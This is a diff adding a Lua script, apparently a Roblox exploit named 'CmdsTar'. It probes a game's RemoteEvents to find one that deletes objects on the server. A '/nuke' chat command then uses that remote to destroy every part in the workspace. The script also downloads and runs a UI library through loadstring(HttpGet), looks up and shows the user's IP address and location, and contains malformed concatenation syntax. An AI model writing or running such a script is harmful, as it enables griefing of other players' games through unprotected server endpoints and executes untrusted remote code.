@@ -1,0 +1,177 @@
+--// Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+
+--// IpWho
+local IpWho = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
+
+--// UiLib
+local UiLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/Breadido/Smoll/main/souce.lua'))()
+
+--// Commands
+local P1 = "/Nuke (Test1) \n Test2 \n Test3"
+local P2 = "Test4 \n Test5 \n Test Other"
+local Cmds = P1 .. "\n" .. P2
+
+--// Variables
+local localPlayer = Players.LocalPlayer
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local FoundRemote = nil
+local Remotes = {}
+local CheckTime = 0.5
+local UseSegway = false
+local Wordlist = {
+    "delete", "remove", "destroy", "clean", "clear",
+    "bala", "bullet", "shoot", "fire", "segway",
+    "deletar", "apagar"
+}
+
+--// Notification
+function Notify(text, B1, B2)
+    if B1 and B2 then
+        StarterGui:SetCore("SendNotification", {
+            Title = "CmdsTar",
+            Text = text,
+            Duration = 5,
+            Button1 = "Yes",
+            Button2 = "No",
+            Callback = function(button)
+                if button == "Button1" then
+                    B1()
+                else
+                    B2()
+                end
+            end
+        })
+    else
+        StarterGui:SetCore("SendNotification", {
+            Title = "CmdsTar",
+            Text = text,
+            Duration = 5
+        })
+    end
+end
+
+--// Build-In Ui
+function UI()
+	local Existing = PlayerGui:FindFirstChild("CmdsTar")
+	if Existing then
+		Existing:Destroy()
+	end
+
+    --// SetupUI
+	local Ui = UiLib.SetupUI({
+		Title = "CmdsTar"
+	})
+
+    --// Tabs
+	local Tab1 = Ui.CreateTabs({
+	    Text = "Welcome"
+    })
+	local Tab2 = Ui.CreateTabs({
+	    Text = "Cmds"
+    })
+	local Tab3 = Ui.CreateTabs({
+	    Text = "Credits"
+    })
+    
+    --// Tab1 / Welcome
+    Tab1.CreateLabel("Welcome To CmdsTar", Enum.TextXAlignment.Center)
+    Tab1.CreateLabel("Use Roblox Chat To Use Commands", Enum.TextXAlignment.Center)
+    Tab1.CreateLabel(" ", Enum.TextXAlignment.Center)
+    Tab1.CreateLabel("IP : " . . IpWho.ip, Enum.TextXAlignment.Center)
+    Tab1.CreateLabel("City : " . . IpWho.city, Enum.TextXAlignment.Center)
+    Tab1.CreateLabel("Country : " . . IpWho.country, Enum.TextXAlignment.Center)
+    
+    --// Tab2 / Cmds or Commands
+    Tab2.CreateLabel("Cmds / Commands", Enum.TextXAlignment.Center)
+    Tab2.CreateLabel(Cmds, Enum.TextXAlignment.Center)
+    
+    --// Tab3 / Credits
+    Tab3.CreateLabel("Credits", Enum.TextXAlignment.Center)
+    Tab3.CreateLabel("Creator", Enum.TextXAlignment.Center)
+    Tab3.CreateLabel("Nuzi (Creator)", Enum.TextXAlignment.Center)
+    Tab3.CreateLabel(" ", Enum.TextXAlignment.Center)
+    Tab3.CreateLabel("Tester", Enum.TextXAlignment.Center)
+    Tab3.CreateLabel("Nuzi (Creator)", Enum.TextXAlignment.Center)
+    Tab3.CreateLabel("Hykl / Intan", Enum.TextXAlignment.Center)
+end
+
+--// Check if a RemoteEvent is the correct one
+local function CheckRemote(Remote)
+    if not Remote.Parent then return end
+
+    local TestInstance = localPlayer:FindFirstChild("StarterGear") or localPlayer:WaitForChild("StarterGear", 1)
+    if not TestInstance then return end
+
+    local success = pcall(function()
+        if Remote.Name == "DestroySegway" then
+            Remote:FireServer(TestInstance, {Value = TestInstance})
+        else
+            Remote:FireServer(TestInstance)
+        end
+    end)
+
+    RunService.Heartbeat:Wait()
+    task.wait(CheckTime + (localPlayer:GetNetworkPing() * 2))
+
+    if not localPlayer:FindFirstChild("StarterGear") then
+        FoundRemote = Remote
+        UseSegway = Remote.Name == "DestroySegway"
+        warn("[CmdsTar]: {Remote Found}", Remote:GetFullName())
+        Notify("[Remote Found]")
+        UI()
+    else
+        warn("[CmdsTar]: {Remote Not Found}")
+        Notify("[Remote Not Found]")
+    end
+end
+
+--// Scan through Instances to find potential Remotes
+local function Scan(Instance, SoftScan)
+    for _, v in ipairs(Instance:GetDescendants()) do
+        if FoundRemote then return end
+        if not v:IsA("RemoteEvent") or table.find(Remotes, v) then continue end
+
+        table.insert(Remotes, v)
+
+        if SoftScan then
+            for _, word in ipairs(Wordlist) do
+                if v.Name:lower():find(word) then
+                    CheckRemote(v)
+                    break
+                end
+            end
+        else
+            CheckRemote(v)
+        end
+    end
+end
+
+--// Function to Destroy a Target using the Found Remote
+local function Destroy(Target)
+    if not FoundRemote or not Target or Target == FoundRemote then return end
+    FoundRemote:FireServer(Target, UseSegway and {Value = Target} or nil)
+end
+
+--// Commands
+-- Nuke
+local function CNuke()
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:IsA("BasePart") then
+			Destroy(obj)
+		end
+	end
+end
+
+--// Chat
+localPlayer.Chatted:Connect(function(msg)
+	if string.lower(msg) == "/nuke" then
+		CNuke()
+	end
+end)
